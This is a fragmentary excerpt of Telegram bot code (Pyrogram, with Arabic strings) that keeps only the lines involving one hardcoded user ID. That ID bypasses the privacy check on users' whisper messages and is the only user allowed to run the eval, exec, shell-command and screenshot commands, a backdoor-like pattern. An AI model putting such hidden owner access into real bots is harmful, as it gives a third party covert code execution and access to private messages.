...
async def open_hms(c: Client, m: Message):
   ...
   if not wsdb.get(f"hms-{id}"):
      ...
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 6929438980 and m.from_user.id != 6929438980:
...
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name} 🍻", url=f't.me/{channel}')]]))
  ...
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     ...
     if m.from_user.id == 6929438980 or m.from_user.id == 6929438980:
       rank = 'تاج راسي ☆'
     else:
...
@Client.on_message(filters.command("eval") & filters.user(6929438980))
...
@Client.on_message(filters.command("exec") & filters.user(6929438980))
...
@Client.on_message(filters.command("cmd") & filters.user(6929438980))
...
@Client.on_message(filters.command("print") & filters.user(6929438980))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(6929438980))
